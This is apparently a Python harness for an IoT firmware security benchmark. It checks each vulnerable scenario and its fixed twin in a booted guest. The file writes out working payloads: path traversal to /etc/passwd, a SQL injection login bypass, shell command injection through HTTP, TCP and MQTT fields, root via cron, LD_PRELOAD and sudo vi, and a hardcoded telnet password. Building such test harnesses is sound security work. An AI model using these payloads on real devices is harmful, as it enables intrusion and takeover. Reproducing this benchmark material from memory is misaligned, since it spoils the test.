"""Payload and signal of each scenario, checked against a booted guest.

A scenario maps the part of the firmware id after the device name, without the
trailing -fixed, to a function that sends the documented payload and returns the
output, and to a regex for the signal. On a vulnerable image the signal must
appear. On a corrected twin it must not appear. A scenario can also give a
"normal" function and regex, a benign request that must work on both.
"""
import json

DASHBOARD = '''
import http.client, json, re, sys
def call(method, path, body=None, headers=None):
    c = http.client.HTTPConnection("127.0.0.1", 8080, timeout=20)
    c.request(method, path, body, headers or {})
    r = c.getresponse()
    return r.status, r.read().decode("utf-8", "replace")
'''


def http_get(path):
    return DASHBOARD + f'''
status, body = call("GET", {path!r})
print(status, body[:600])
'''


def dashboard_action(action, **fields):
    payload = json.dumps(dict(action=action, **fields))
    return DASHBOARD + f'''
status, page = call("GET", "/")
token = re.search(r'[Tt]oken["\\']?\\s*[:=]\\s*["\\']([0-9a-f]{{16,}})', page) or re.search(r'content="([0-9a-f]{{16,}})"', page)
token = token.group(1) if token else ""
status, body = call("POST", "/api.php", {payload!r}, {{"Content-Type": "application/json", "X-Dashboard-Token": token}})
print(status, body[:900])
'''


def tcp(port, data, wait=3):
    return f'''
import socket
s = socket.create_connection(("127.0.0.1", {port}), timeout=15)
s.sendall({data!r})
s.settimeout({wait})
out = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass
print(out.decode("utf-8", "replace")[:900])
'''


# slug: (kind, payload, signal regex, optional normal payload, optional normal regex)
SCENARIOS = {
    "router-cwe276-leaked-private-key": ("host", http_get("/debug/device-private.key"), r"BEGIN [A-Z ]*PRIVATE KEY",
                                         http_get("/"), r"^200"),
    "router-cwe022-path-traversal": ("host", http_get("/missing/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"),
                                     r"root:[^:]*:0:0", None, None),
    "router-cwe089-http-sqli-auth": ("host", dashboard_action("sqli_login", username="' OR '1'='1", password="' OR '1'='1"),
                                     r"role=admin", dashboard_action("sqli_login", username="nobody", password="x"), r"role="),
    "router-cwe078-os-command-injection": ("host", dashboard_action("ping", target="127.0.0.1; id"), r"uid=\d+", None, None),
    "router-cwe078-bash-command-injection": ("host", dashboard_action("bash_diag", target="127.0.0.1; id"), r"uid=\d+", None, None),
    "router-cwe077-c-command-injection": ("host", dashboard_action("c_diag", target="router; id"), r"uid=\d+", None, None),
    "router-cwe416-use-after-free": ("host", dashboard_action("uaf_run", payload="role=admin;device=router"),
                                     r"ACCESS GRANTED", dashboard_action("uaf_run", payload="role=user"), r"access denied"),
    "router-cwe400-diagnostic-dos": ("host", dashboard_action("dos_run", megabytes="64"), r"allocated and touched 64 MB", None, None),
    "router-cwe078-service-interface-injection": ("host", tcp(9090, b"status; id\n"), r"uid=\d+", None, None),
}


def script(name, *arguments):
    """Run one of the repository exploit clients, which is mounted at /scripts."""
    return ("python3", f"/scripts/{name}", *arguments)


MQTT_MAINTENANCE = {
    "smartplug": ("relay-schedule", "weekday-18:00; id"), "thermostat": ("hvac-profile", "eco.json; id"),
    "smartbulb": ("lighting-scene", "evening; id"), "smarthub": ("pairing-backup", "paired.tar; id"),
    "envsensor": ("calibration", "co2-zero; id"), "smartspeaker": ("media-source", "radio-local; id"),
    "healthmonitor": ("export-target", "clinic-a; id"), "doorlock": ("firmware-url", "stable.bin; id"),
}
for device, (action, value) in MQTT_MAINTENANCE.items():
    SCENARIOS[f"{device}-cwe078-os-command-injection"] = (
        "host", script("exploit-mqtt-maintenance.py", device, action, value), r"uid=0\(root\)", None, None)
SCENARIOS["plc-cwe078-os-command-injection"] = ("host", script("exploit-modbus-maintenance.py"), r"uid=0\(root\)", None, None)
SCENARIOS["ipcamera-cwe078-os-command-injection"] = ("host", http_get("/cgi-bin/ptz.cgi?preset=home%3Bid"), r"uid=\d+", None, None)
DEVICE_SIGNALS = {
    "ipcamera-cwe022-recording-path-traversal": ("ipcamera", r"root:[^:]*:0:0"),
    "smartplug-cwe862-missing-authorization": ("smartplug", r"authorization=skipped"),
    "thermostat-cwe294-command-replay": ("thermostat", r"count=1.*count=2"),
    "smartbulb-cwe122-zcl-heap-overflow": ("smartbulb", r"HEAP_OVERFLOW"),
    "smarthub-cwe121-database-stack-overflow": ("smarthub", r"STACK_OVERFLOW"),
    "envsensor-cwe306-unauthenticated-calibration": ("envsensor", r"authenticated=no"),
    "smartspeaker-cwe122-id3-heap-overflow": ("smartspeaker", r"HEAP_OVERFLOW"),
    "healthmonitor-cwe200-memory-disclosure": ("healthmonitor", r"patient_id=PT-1042"),
    "doorlock-cwe294-unlock-replay": ("doorlock", r"count=1.*count=2"),
    "plc-cwe121-modbus-stack-overflow": ("plc", r"STACK_OVERFLOW"),
}
for firmware, (device, signal) in DEVICE_SIGNALS.items():
    SCENARIOS[firmware] = ("host", script("exploit-device-cve-scenarios.py", device), signal, None, None)


def guest_steps(*commands, wait=0, timeout=280):
    """Commands run as root in the guest over the serial console, their output is joined."""
    return ("guest", commands, wait, timeout)


def interactive_session(pairs):
    return ("interactive", pairs, 0)


SCENARIOS["router-cwe276-bad-chown-rights"] = (
    "guest", guest_steps(
        "su -s /bin/sh routerweb -c \"printf 'DNS_OVERRIDE=attacker-controlled\\n' > /etc/iotbench/wan-policy.conf\" 2>&1 && echo WRITE_OK || echo WRITE_DENIED",
        "cat /etc/iotbench/wan-policy.conf"), r"WRITE_OK", None, None)
SCENARIOS["router-cwe078-writable-root-cron"] = (
    "guest", guest_steps(
        "rm -f /tmp/iotbench-cron-root",
        "su -s /bin/sh routerweb -c \"printf 'router; id > /tmp/iotbench-cron-root\\n' > /var/lib/router-dashboard/maintenance-target\"",
        "/var/lib/router-dashboard/cron-maintenance.sh; cat /tmp/iotbench-cron-root 2>&1"), r"uid=0\(root\)", None, None)
SCENARIOS["router-cwe798-ld-preload-sudo"] = (
    "guest", guest_steps(
        "rm -f /tmp/iotbench-ldpreload-root",
        "su -s /bin/sh routerweb -c \"echo iotbench | sudo -S LD_PRELOAD=/usr/lib/iotbench/preload-marker.so /usr/bin/ldpreload-target\" 2>&1",
        "cat /tmp/iotbench-ldpreload-root 2>&1"), r"euid=0", None, None)
SCENARIOS["router-cwe798-vi-privilege-escalation"] = (
    "vi_sudo", ("vi_sudo", "rm -f /tmp/iotbench-vi.txt",
               "su -s /bin/sh routerweb -c 'sudo -S /bin/busybox vi /tmp/iotbench-vi.txt'",
               "iotbench", r"[#\$] $"),
    r"uid=0\(root\)", None, None)
SCENARIOS["router-cwe287-ssh-hardcoded-backdoor"] = (
    "guest", guest_steps("grep '^support:' /etc/passwd /etc/shadow 2>&1"), r"support:\$6\$", None, None)


def guest_python(code):
    encoded = code.encode().hex()
    chunks = [encoded[i:i + 1024] for i in range(0, len(encoded), 1024)]
    commands = ["rm -f /tmp/iotbench_guest_python.hex"]
    commands += [f"printf '%s' '{chunk}' >> /tmp/iotbench_guest_python.hex" for chunk in chunks]
    commands.append("python3 -c \"import codecs; "
                    "exec(codecs.decode(open('/tmp/iotbench_guest_python.hex').read(), 'hex'))\"")
    return guest_steps(*commands)


_APACHE_PREPARE = (
    "echo 1 > /proc/sys/net/core/fb_tunnels_only_for_init_net; rm -rf /tmp/af; "
    "cp -r /usr/share/iotbench/apache-fixture /tmp/af; "
    "sed -i 's/^Timeout 5$/Timeout 90/' /tmp/af/httpd.conf.in; "
    "sed -i -e 's/time.monotonic() + 5$/time.monotonic() + 90/' -e 's/wait(timeout=5)/wait(timeout=30)/' "
    "-e 's/timeout=5)$/timeout=90)/' "
    "/tmp/af/test-fixtures.py; "
    "T=test_intended_weakness; grep -q test_weakness_removed /tmp/af/test-fixtures.py && T=test_weakness_removed; "
    "sed -i \"s/unittest.main(verbosity=2)/unittest.main(argv=['t', 'Tests.$T'], verbosity=2)/\" /tmp/af/test-fixtures.py; "
    "sed -i 's/timeout=120)/timeout=1800)/' /tmp/af/fixture-build.py; "
    "[ -f /tmp/af/variants/cwe078.py ] && sed -i 's/timeout=2,/timeout=20,/' /tmp/af/variants/cwe078.py; "
    "chown -R iotapache /tmp/af")


def _apache_steps(cwe):
    partial = " --http-only" if cwe in ("079", "352") else ""
    run = (f"su -s /bin/sh -c 'python3 /tmp/af/fixture-build.py --mode fixture --enable 1 --cwe {cwe}{partial} "
           "--apache /usr/sbin/httpd --modules /usr/libexec/apache2/modules' iotapache > /tmp/ap.out 2>&1; "
           "echo EXIT=$?; tail -c 1200 /tmp/ap.out")
    return guest_steps(_APACHE_PREPARE, run, timeout=1800)


for _device in ("router", "ipcamera", "smartplug", "thermostat", "plc", "smartbulb", "smarthub",
                "envsensor", "smartspeaker", "healthmonitor", "doorlock"):
    for _cwe in ("020", "022", "077", "078", "079", "089", "287", "306", "352", "862"):
        SCENARIOS[f"{_device}-cwe{_cwe}-apache-web"] = ("selftest", _apache_steps(_cwe), r"EXIT=0", None, None)

_REST_PAYLOAD = guest_steps(
    "root=/usr/share/iotbench/rest-internal-files; rm -f \"$root/run/rest.sock\"",
    "\"$root/bin/fixture-rest\" --isolated-fixture & echo $! > /tmp/iotbench-rest.pid",
    "i=0; while [ $i -lt 20 ] && [ ! -S \"$root/run/rest.sock\" ]; do i=$((i + 1)); sleep 1; done; "
    "curl -s --unix-socket \"$root/run/rest.sock\" "
    "\"http://x/api/config?file=..%2Frestricted%2Fmarker.txt\"",
    "kill \"$(cat /tmp/iotbench-rest.pid)\" 2>/dev/null; true")
_REST_NORMAL = ("guest", tuple(c.replace("..%2Frestricted%2Fmarker.txt", "config.cfg") for c in _REST_PAYLOAD[1]), 0, 280)
for _device in ("router", "ipcamera", "smartplug", "thermostat", "plc", "smartbulb", "smarthub",
                "envsensor", "smartspeaker", "healthmonitor", "doorlock"):
    SCENARIOS[f"{_device}-cwe022-rest-internal-files"] = (
        "guest", _REST_PAYLOAD, r"IOTBENCH_SYNTHETIC_REST_BOUNDARY_MARKER",
        _REST_NORMAL, r"device=synthetic-fixture")

_CRON_PAYLOAD = guest_steps(
    "mkdir -p /usr/share/iotbench/cronjob-wildcard-injection/inbox",
    "touch /usr/share/iotbench/cronjob-wildcard-injection/inbox/--fixture-diagnostic",
    "cd /usr/share/iotbench/cronjob-wildcard-injection && rm -f logs/vulnerable.jsonl && "
    "python3 fixture-runner.py --isolated-fixture 2>&1")
_CRON_NORMAL = guest_steps(
    "cd /usr/share/iotbench/cronjob-wildcard-injection && rm -f logs/*.jsonl inbox/--fixture-diagnostic && "
    "python3 fixture-runner.py --isolated-fixture 2>&1")
for _device in ("router", "ipcamera", "smartplug", "thermostat", "plc", "smartbulb", "smarthub",
                "envsensor", "smartspeaker", "healthmonitor", "doorlock"):
    SCENARIOS[f"{_device}-cwe088-cronjob-wildcard-injection"] = (
        "guest", _CRON_PAYLOAD, r'"result":\s*"synthetic-diagnostic"', _CRON_NORMAL, r'"result":\s*"nominal"')

_COAP_CLIENT = """
import socket
header = bytes([0x40, 0x01, 0x00, 0x01])
options = b""
previous = 0
for segment in (b"maintenance", b"info"):
    options += bytes([((11 - previous) << 4) | len(segment)]) + segment
    previous = 11
target = "127.0.0.1"
if EXTERNAL:
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    probe.connect(("10.0.2.2", 9))
    target = probe.getsockname()[0]
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(10)
s.sendto(header + options, (target, 5683))
try:
    data, _ = s.recvfrom(2048)
    print("CODE", data[1], data[4:].decode("utf-8", "replace"))
except socket.timeout:
    print("CODE none")
"""
for _device in ("router", "ipcamera", "smartplug", "thermostat", "plc", "smartbulb", "smarthub",
                "envsensor", "smartspeaker", "healthmonitor", "doorlock"):
    SCENARIOS[f"{_device}-cwe862-coap-internal-files"] = (
        "guest", guest_python("EXTERNAL = True" + _COAP_CLIENT), r"COAP_INTERNAL_MAINTENANCE_EXPOSED",
        guest_python("EXTERNAL = False" + _COAP_CLIENT), r"COAP_INTERNAL_MAINTENANCE_EXPOSED")

_TELNET_PAYLOAD = guest_steps(
    "touch /run/iotbench-telnet-test",
    "systemctl start iotbench-telnet.service",
    "TELNET_PID=$(systemctl show --property=MainPID --value iotbench-telnet.service); sleep 3; "
    "{ sleep 1; printf 'maintenance\\r\\n'; sleep 1; printf 'Maintenance-Telnet-42\\r\\n'; sleep 1; "
    "printf 'id; cat /etc/iotbench/device.conf\\r\\n'; sleep 1; printf 'exit\\r\\n'; sleep 1; } | "
    "nsenter -t \"$TELNET_PID\" -n telnet 127.0.0.1 2323 2>&1",
    "systemctl stop iotbench-telnet.service",
    "rm -f /run/iotbench-telnet-test")
for _device in ("router", "ipcamera", "smartplug", "thermostat", "plc", "smartbulb", "smarthub",
                "envsensor", "smartspeaker", "healthmonitor", "doorlock"):
    SCENARIOS[f"{_device}-cwe798-unencrypted-traffic"] = (
        "guest", _TELNET_PAYLOAD, r"uid=\d+\(maintenance\)",
        guest_steps("id maintenance 2>&1; systemctl cat iotbench-telnet.service 2>&1 | head -c 200"),
        r"uid=\d+\(maintenance\)")
